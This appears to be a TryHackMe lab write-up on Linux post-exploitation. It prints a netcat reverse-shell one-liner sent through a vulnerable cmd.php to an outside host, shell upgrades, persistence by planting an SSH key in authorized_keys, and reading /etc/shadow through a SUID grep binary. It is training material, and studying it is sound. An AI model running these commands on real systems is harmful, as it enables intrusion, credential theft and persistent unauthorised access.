# Room
https://tryhackme.com/room/lle

# Task 1 - Intro
Create a local listener
```
nc -nvlp 5544
listening on [any] 5544 ...
```

Establish a reverse shell using the vulnerable cmd.php script that runs any remote shell command
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.b.c.d 1234 >/tmp/f
```
Check local listener
```
connect to [a.b.c.d] from (UNKNOWN) [10.10.200.181] 50154
/bin/sh: 0: can't access tty; job control turned off
$ whoami
manager
```

# Task 2 - tty
A basic netcat shell needs to be upgraded

* Upgrade with Python
    ```
    python3 -c 'import pty; pty.spawn("/bin/bash")'

    $ whoami
    manager
    $ python3 -c 'import pty; pty.spawn("/bin/bash")'
    manager@py:~/Desktop$ 
    ```

* Upgrade with Perl
    ```
    perl -e 'exec "/bin/bash";'
    ```

# Task 3 - ssh
SSH can use RSA keys for authentication.  They are usually stored in the /home/user/.ssh directory in a file called id_rsa and id_rsa.pub.  The id_rsa file itself should have rw permissions for your user (600).  You can id_rsa to connect using SSH with ssh -i for hosts that contain a copy of your public key: id_rsa.pub
* Connect using private key
    ```
    chmod 600 id_rsa

    ssh -i id_rsa user@a.b.c.d
    ```
* If RSA keys do not exist you can create them with ssh-keygen
    ```
    ssh-keygen

    manager@py:~/.ssh$ ls -lrta
    ls -lrta
    total 8
    drwx------  2 manager manager 4096 Aug  4 11:43 .
    drwxr-xr-x 16 manager manager 4096 Oct 25 13:43 ..

    manager@py:~/.ssh$ ssh-keygen
    ssh-keygen
    Generating public/private rsa key pair.
    Enter file in which to save the key (/home/manager/.ssh/id_rsa): 

    Enter passphrase (empty for no passphrase): 

    Enter same passphrase again: 

    Your identification has been saved in /home/manager/.ssh/id_rsa.
    Your public key has been saved in /home/manager/.ssh/id_rsa.pub.
    The key fingerprint is:
    SHA256:RWXkxa93mpeMB1EMWeZxadI6+oFEFhVXNipzbmXuZTE manager@py
    The key's randomart image is:
    +---[RSA 2048]----+
    |          .+*=O**|
    |         . = +*B+|
    |          +o.o=E |
    |         . .=++ +|
    |        S . ooooo|
    |           o.oo.+|
    |            . ==o|
    |             oo+.|
    |              .. |
    +----[SHA256]-----+
    ```
* ssh-keygen creates two files, id_rsa, and id_rsa.pub.  id_rsa is your private key and should stay on only trusted and secure systems, never give it away.  id_rsa.pub is your public key, it can be appended to a remote machine's authorized_keys file to allow you to connect to it with your private key and a valid local user on the system
    ```
    manager@py:~/.ssh$ ls -lrta
    ls -lrta
    total 16
    drwxr-xr-x 16 manager manager 4096 Oct 25 13:43 ..
    -rw-r--r--  1 manager manager  392 Jan 24 19:53 id_rsa.pub
    -rw-------  1 manager manager 1675 Jan 24 19:53 id_rsa
    drwx------  2 manager manager 4096 Jan 24 19:53 .
    manager@py:~/.ssh$ 
    ```
* append public key to authorized_keys in order to allow connection using private key
    ```
    manager@py:~/.ssh$ echo "ssh-rsa AAAAB.............dabXrDwdkOBakjk= some1@kali" > authorized_keys

    manager@py:~/.ssh$ ls -lrta
    ls -lrta
    total 20
    drwxr-xr-x 16 manager manager 4096 Oct 25 13:43 ..
    -rw-r--r--  1 manager manager  392 Jan 24 19:53 id_rsa.pub
    -rw-------  1 manager manager 1675 Jan 24 19:53 id_rsa
    -rw-rw-r--  1 manager manager  562 Jan 24 20:02 authorized_keys
    drwx------  2 manager manager 4096 Jan 24 20:02 .

    manager@py:~/.ssh$ cat authorized_keys
    cat authorized_keys
    ssh-rsa AAAAB.............dabXrDwdkOBakjk= some1@kali    
    ```

# Task 4 - Basic enumeration
* Initial enumeration tasks
    * uname -a - prints information about the system
    ```
    manager@py:~/.ssh$ uname -a
    uname -a
    Linux py 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
    ```
    * check .bash_history, .bash_profile, and .bashrc in the user directory for indications of last used commands, and the possibility of programs or jobs executing
    * check the version of sudo with sudo -V
    ```
    manager@py:~/.ssh$ sudo -V
    sudo -V
    Sudo version 1.8.21p2
    Sudoers policy plugin version 1.8.21p2
    Sudoers file grammar version 46
    Sudoers I/O plugin version 1.8.21p2
    ```
    * check the current user's sudo rights with sudo -l

# Task 5 - /etc
The /etc directory is a central location for storing configuration files for the applications running on your system, many important file live here
* /etc/passwd - a text file that contains all user accounts on the system including their user ID, group ID, home directory, and shell
* /etc/shadow - stores password hashes of the users found in the /etc/passwd file, the hashes are salted and some of the algorithm prefixes include:
    * $1$ - MD5
    * $2a$ - Blowfish
    * $2y$ - Blowfish
    * $5$ - SHA-256
    * $6$ - SHA-512
* /etc/hosts - allows you to map hostnames to specific IPs instead of resolving them with DNS

# Task 6 - Find
The find command allows you to search the filesystem for anything you are looking for
* Examples
    * Use find . to search the current directory forward
    ```
    manager@py:~$ find . -type f -name index*
    find . -type f -name index*
    ./.cache/mozilla/firefox/wj459bjf.default/OfflineCache/index.sqlite
    ./Desktop/index.html
    ```
    * Use find / to search from the root directory forward
    ```
    manager@py:~$ find / -type d -name Radiance 2>/dev/null
    find / -type d -name Radiance 2>/dev/null
    /usr/share/themes/Radiance
    /snap/gnome-3-26-1604/59/usr/share/themes/Radiance
    /snap/gnome-3-26-1604/100/usr/share/themes/Radiance
    ```

# Task 7 - SUID
SUID stands for Set User ID and is a permission that lets users execute a file with the permission of another user.  SUID abuse is a common tactic in privilege escalation

* Find all SUID files
    ```
    find / -perm -u=s -type f 2>/dev/null
    ```
* Example when grep is found with SUID
    ```
    Research : https://gtfobins.github.io/

    manager@py:~$ LFILE=/etc/shadow
    LFILE=/etc/shadow
    
    manager@py:~$ /bin/grep '' $LFILE
    /bin/grep '' $LFILE
    ```

# Task 8 - Port Forwarding
Port forwarding allows you to redirect communication from one address/port number to another
* Useful netstat examples for seeing what is listening
    * TCP
    ```
    netstat -vatnp
    ```
    * UDP
    ```
    netstat -vanpu
    ```
    * Both
    ```
    netstat -vatnpu
    ```

# Task 9 - Enumeration Automation
A few examples of enumeration automation include linpeas and linenum
* linpeas
    * https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
* linenum
    * https://github.com/rebootuser/LinEnum